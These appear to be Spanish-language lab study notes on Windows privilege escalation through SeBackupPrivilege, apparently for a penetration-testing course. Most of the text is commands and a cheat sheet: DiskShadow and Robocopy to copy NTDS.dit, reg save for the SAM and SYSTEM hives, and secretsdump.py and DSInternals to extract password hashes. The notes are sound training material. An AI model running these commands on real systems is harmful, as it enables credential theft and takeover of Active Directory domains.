
## 1. Enumeración de grupos y privilegios

Comprobar los grupos del usuario actual:

```
whoami /groups
```

Comprobar los privilegios:

```
whoami /priv
```

Grupos interesantes para la escalada de privilegios:

- **Backup Operators**: dispone de `SeBackupPrivilege` y `SeRestorePrivilege`.
    
- **Event Log Readers**: acceso a los registros de eventos.
    
- **DnsAdmins**: puede ofrecer oportunidades de escalada dependiendo de la configuración.
    
- **Hyper-V Administrators**: privilegios relacionados con la administración de Hyper-V.
    
- **Print Operators**: privilegios relacionados con la administración de impresión.
    
- **Server Operators**: permisos administrativos específicos sobre el servidor.
    

## 2. SeBackupPrivilege

Permite recorrer directorios y leer archivos protegidos mediante operaciones de copia de seguridad, incluso cuando las ACL no conceden acceso de lectura al usuario.

**Importante:** `copy` y `Copy-Item` no aprovechan automáticamente este privilegio. Se necesita una herramienta que lo utilice explícitamente.

### Importar las herramientas

En PowerShell, desde el directorio donde estén las DLL:

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### Comprobar y habilitar el privilegio

```
Get-SeBackupPrivilege
```

Si está deshabilitado:

```
Set-SeBackupPrivilege
```

Verificar de nuevo:

```
Get-SeBackupPrivilege
```

También puedes comprobarlo con:

```
whoami /priv
```

### Copiar un archivo protegido

Ejemplo para copiar un archivo de texto protegido:

```
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' '.\Contract.txt'
```

Ejemplo para copiar un archivo de la carpeta `Administrator` a `C:\Windows\Temp`:

```
Copy-FileSeBackupPrivilege 'C:\Users\Administrator\archivo.txt' 'C:\Windows\Temp\archivo.txt'
```

Sustituye `archivo.txt` por el nombre real del archivo.

Para leer el archivo copiado:

```
Get-Content 'C:\Windows\Temp\archivo.txt'
```

## 3. Copiar archivos protegidos con Robocopy

También se puede utilizar `robocopy` con el modo de copia de seguridad `/B`.

Sintaxis:

```
robocopy /B "ORIGEN" "DESTINO" "ARCHIVO"
```

Ejemplo del módulo:

```
robocopy /B E:\Windows\NTDS C:\Tools\ntds ntds.dit
```

El archivo se copia desde el directorio de origen al directorio de destino utilizando el modo de copia de seguridad.

**Nota:** `/B` permite utilizar el modo de copia de seguridad, pero no soluciona cualquier problema de permisos. Una denegación explícita en una ACL también puede impedir el acceso.

## 4. Copiar NTDS.dit mediante DiskShadow

En un controlador de dominio, `NTDS.dit` contiene información de Active Directory y está bloqueado mientras lo utiliza el sistema.

Con `SeBackupPrivilege`, se puede crear una instantánea del volumen y acceder al archivo desde ella.

### Crear la instantánea

Ejecutar:

```
diskshadow.exe
```

Dentro de DiskShadow:

```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

La instantánea queda expuesta como unidad `E:`.

### Copiar NTDS.dit

En PowerShell:

```
Copy-FileSeBackupPrivilege 'E:\Windows\NTDS\ntds.dit' 'C:\Tools\ntds.dit'
```

## 5. Guardar los hives SAM y SYSTEM

Los hives `SAM` y `SYSTEM` se pueden guardar con `reg save`:

```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

Estos archivos pueden utilizarse posteriormente para analizar las credenciales locales sin conexión.

## 6. Extraer hashes de NTDS.dit

### Con Impacket

Desde la máquina atacante, una vez que tengas `ntds.dit` y `SYSTEM`:

```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

La herramienta extrae los hashes de las cuentas almacenadas en la base de datos.

### Con DSInternals

En PowerShell, con el módulo y los archivos necesarios:

```
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
```

Consultar una cuenta concreta:

```
Get-ADDBAccount -DistinguishedName 'CN=Administrator,CN=Users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

Cambia el DN según el dominio y la cuenta del laboratorio.

## Chuleta rápida

|Objetivo|Comando|
|---|---|
|Ver grupos|`whoami /groups`|
|Ver privilegios|`whoami /priv`|
|Comprobar SeBackupPrivilege|`Get-SeBackupPrivilege`|
|Habilitar el privilegio|`Set-SeBackupPrivilege`|
|Copiar archivo protegido|`Copy-FileSeBackupPrivilege 'ORIGEN' 'DESTINO'`|
|Copiar con Robocopy|`robocopy /B "ORIGEN" "DESTINO" "ARCHIVO"`|
|Guardar SYSTEM|`reg save HKLM\SYSTEM SYSTEM.SAV`|
|Guardar SAM|`reg save HKLM\SAM SAM.SAV`|
|Extraer hashes de NTDS|`secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`|

**Flujo habitual en un examen:** enumerar `whoami /priv` → habilitar `SeBackupPrivilege` → copiar el archivo protegido con `Copy-FileSeBackupPrivilege` → analizar su contenido.
